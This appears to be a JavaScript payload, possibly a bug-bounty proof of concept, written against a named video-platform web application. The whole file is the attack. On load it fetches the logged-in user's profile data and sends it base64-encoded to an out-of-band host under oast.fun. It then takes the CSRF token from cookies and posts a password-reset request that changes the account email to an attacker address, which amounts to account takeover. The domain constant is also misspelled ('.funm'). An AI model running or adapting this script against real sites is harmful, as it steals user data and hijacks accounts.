const DOMAIN = "vpwdwxfngpwtohjgivjgs4pcuiojwzqo2.oast.funm";
const EMAIL = "attacker@vpwdwxfngpwtohjgivjgs4pcuiojwzqo2.oast.fun";

function processAndResetPassword() {
    try {
        const getRequest = new XMLHttpRequest();
        getRequest.open("GET", "/apis/1.0/me/deep/get", false);
        getRequest.setRequestHeader("Content-Type", "application/json");
        getRequest.send();

        if (getRequest.status !== 200) {
            throw new Error(`Failed to fetch data: ${getRequest.statusText}`);
        }

        const responseData = JSON.parse(getRequest.responseText);

        const userId = responseData?.data?.profile?.id;
        const featureId = responseData?.data?.content?.features?.find(feature => feature.type === "contentcliplive")?.id;

        if (!userId) {
            throw new Error("User ID not found in response.");
        }

        if (!featureId) {
            throw new Error("Feature ID (contentcliplive) not found in response.");
        }

        const base64Response = btoa(JSON.stringify(responseData));
        const redirectUrl = `https://${DOMAIN}/?base64=${encodeURIComponent(base64Response)}`;

        console.log(`Redirecting to: ${redirectUrl}`);
        window.location.href = redirectUrl;

        const token = document.cookie.split('; ').find(row => row.startsWith('csrftoken='))?.split('=')[1];
        if (!token) {
            throw new Error("CSRF token not found in cookies.");
        }

        const resetRequest = new XMLHttpRequest();
        resetRequest.open("POST", `/apis/1.0/feature-${featureId}/users/change_password`, false);
        resetRequest.setRequestHeader("Referer", "https://ristretto.wildmoka.com");
        resetRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        resetRequest.setRequestHeader("X-Csrftoken", token);

        const resetPayload = `id=${encodeURIComponent(userId)}&email=${encodeURIComponent(EMAIL)}&reset_password=true`;
        resetRequest.send(resetPayload);

        if (resetRequest.status !== 200) {
            throw new Error(`Failed to reset password: ${resetRequest.statusText}`);
        }

        console.log("Password reset successfully.");
    } catch (error) {
        console.error("An error occurred:", error.message);
    }
}

processAndResetPassword();
